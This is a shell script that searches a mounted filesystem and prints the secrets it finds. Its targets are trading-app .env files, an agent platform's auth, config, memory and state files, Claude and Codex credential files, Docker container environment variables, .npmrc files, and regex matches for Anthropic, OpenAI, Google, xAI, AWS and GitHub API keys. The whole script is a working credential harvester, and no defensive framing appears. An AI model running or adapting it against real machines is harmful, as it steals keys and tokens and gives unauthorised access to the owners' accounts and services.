#!/bin/sh
O=/m/opt; H=/m/home/ubuntu; R=/m/root; D=/m/dc
s(){ echo; echo "===== $1 ====="; }
s OPT_LS; ls -la $O 2>&1
s ENV_UNCOMMENTED
for f in $O/qtrade/.env $O/trading-pod/src/.env $O/trading-pod/.env $O/pool/.env; do echo "## $f"; if [ -f "$f" ]; then grep -v '^[[:space:]]*#' "$f" | grep -v '^[[:space:]]*$' | head -50; else echo MISSING; fi; done
s QT_LS; ls -la $O/qtrade 2>&1 | head -25; ls -la $O/trading-pod 2>&1 | head -25
s HERMES_ENV_UNCOMMENTED; grep -v '^[[:space:]]*#' $O/openclaw/hermes-data/.env 2>/dev/null | grep -v '^[[:space:]]*$' | head -40
s HERMES_CFG_HEAD; head -c 6000 $O/openclaw/hermes-data/config.yaml 2>&1
s HERMES_CFG_KEYS; grep -inE 'api_key|apikey|token|secret|base_url|provider|model' $O/openclaw/hermes-data/config.yaml 2>/dev/null | head -60
s HERMES_AUTH; cat $O/openclaw/hermes-data/auth.json 2>&1
s HERMES_CRON; head -c 5000 $O/openclaw/hermes-data/cron/jobs.json 2>&1
s HERMES_MEM; ls -la $O/openclaw/hermes-data/memories $O/openclaw/hermes-data/sessions 2>&1 | head -20
s HERMES_MEMFILES; for f in $O/openclaw/hermes-data/memories/*; do echo "## $f"; head -c 1200 "$f" 2>&1; echo; done
s HERMES_STATEDB; strings $O/openclaw/hermes-data/state.db 2>/dev/null | grep -iE 'sk-|AIza|AKIA|xai-|api_key|bearer|ghp_' | head -30
s CLAUDE_BAKS; for f in $O/openclaw/claude-home/backups/*; do echo "## $f $(wc -c <"$f" 2>/dev/null)"; done
s CLAUDE_BAK_KEYS; grep -ohE '"(apiKey|accessToken|refreshToken|oauthAccount|organizationUuid|accountUuid)"[: ]+["]?[^",]{4,120}' $O/openclaw/claude-home/backups/* 2>/dev/null | sort -u | head -30
s CLAUDE_BAK_BIG; f=$(ls -S $O/openclaw/claude-home/backups/* 2>/dev/null | head -1); echo "## $f"; head -c 9000 "$f" 2>&1
s JSONL_KEYS; grep -rhoE 'sk-ant-[A-Za-z0-9_-]{10,}|sk-or-v1-[A-Za-z0-9]{20,}|sk-proj-[A-Za-z0-9_-]{10,}|sk-svcacct-[A-Za-z0-9_-]{10,}|AIza[0-9A-Za-z_-]{20,}|xai-[A-Za-z0-9]{10,}|AKIA[0-9A-Z]{16}|AQ\.[A-Za-z0-9_-]{20,}|ghp_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,}' $O/openclaw/claude-home/projects 2>/dev/null | sort -u | head -40
s GW_BAKS; for f in $O/openclaw/gateway-state/openclaw.json.bak $O/openclaw/gateway-state/openclaw.json.bak.1 $O/openclaw/gateway-state/openclaw.json.bak.2 $O/openclaw/gateway-state/openclaw.json.bak.3 $O/openclaw/gateway-state/openclaw.json.bak.4; do echo "## $f"; head -c 1200 "$f" 2>&1; echo; done
s GW_SQLITE; for f in $O/openclaw/gateway-state/tasks/runs.sqlite $O/openclaw/gateway-state/memory/main.sqlite; do echo "## $f $(wc -c <"$f" 2>/dev/null)"; strings "$f" 2>/dev/null | grep -iE 'sk-|AIza|AKIA|xai-|api_key|bearer' | head -20; done
s OC_WS; find $O/openclaw/workspace -maxdepth 3 -type f 2>/dev/null | head -30
s DOCKER_ENV; for f in $D/*/config.v2.json; do [ -f "$f" ] || continue; echo "## $f"; tr -c '[:print:]' ' ' < "$f" | grep -oE '"Name":"[^"]*"|"Env":\[[^]]*\]' | head -c 6000; echo; done
s ROOT_NPMRC; cat $R/.npmrc 2>&1; echo; cat $R/.pydistutils.cfg 2>&1; echo; cat $R/.docker/.token_seed 2>&1
s ROOT_ANSIBLE; find $R/.ansible -maxdepth 3 2>/dev/null | head -20; find $H/.ansible -maxdepth 3 2>/dev/null | head -20
s UBUNTU_CLAUDE_KEYS; grep -ohE '"(apiKey|accessToken|refreshToken|oauthAccount|organizationUuid)"[: ]+["]?[^",]{4,120}' $H/.claude.json 2>&1 | sort -u | head -20
s UBUNTU_CLAUDE_CRED; ls -la $H/.claude 2>&1 | head; head -c 2000 $H/.claude/.credentials.json 2>&1
s CODEX; ls -la $H/.codex 2>&1 | head -15; head -c 2500 $H/.codex/config.toml 2>&1; echo; head -c 2000 $H/.codex/auth.json 2>&1
s UBUNTU_NPMRC; cat $H/.npmrc 2>&1
s QT_HOME; ls -la $H/qtrade 2>&1 | head; head -c 2000 $H/qtrade/*.json 2>&1
s GREP_ALL_SMALL; grep -rhoE 'sk-ant-[A-Za-z0-9_-]{10,}|sk-or-v1-[A-Za-z0-9]{20,}|sk-proj-[A-Za-z0-9_-]{10,}|AIza[0-9A-Za-z_-]{20,}|xai-[A-Za-z0-9]{10,}|AKIA[0-9A-Z]{16}' $H/.codex $H/qtrade $O/qtrade 2>/dev/null | sort -u | head -30
echo; echo "=====END====="
exit 1
